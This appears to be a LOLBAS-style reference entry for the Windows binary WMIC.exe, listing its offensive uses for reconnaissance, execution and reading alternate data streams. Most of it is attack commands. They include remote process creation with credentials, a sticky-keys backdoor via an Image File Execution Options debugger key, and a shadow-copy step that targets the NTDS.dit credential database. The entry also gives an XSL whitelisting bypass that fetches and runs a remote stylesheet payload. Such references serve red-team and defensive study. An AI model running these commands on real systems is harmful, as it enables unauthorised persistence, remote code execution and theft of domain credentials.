## WMIC.exe

* Functions: Reconnaissance, Execute, Read ADS

```
wmic process call create calc    

wmic process call create '"c:\ads\file.txt:program.exe"'
   
wmic useraccount get /ALL    
    
wmic process get caption,executablepath,commandline     
    
wmic qfe get description,installedOn /format:csv    
    
wmic /node:"192.168.0.1" service where (caption like "%sql server (%")    
    
get-wmiobject –class "win32_share" –namespace "root\CIMV2" –computer "targetname"    
    
wmic /user:<username> /password:<password> /node:<computer_name> process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"    
    
wmic /NODE: "192.168.0.1" process call create "evil.exe"    
    
wmic /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"    
    
wmic /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"    
     
wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"    
     
wmic os get /format:"MYXSLFILE.xsl"    
     
wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"   
```

Acknowledgements:
* Casey Smith - @subtee

Code sample:
* [Wmic_calc.xsl](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl)   

Resources:
* https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
* https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
* https://twitter.com/subTee/status/986234811944648707

Full path:
```
c:\windows\system32\wbem\wmic.exe
c:\windows\sysWOW64\wbem\wmic.exe
```

Notes:



 
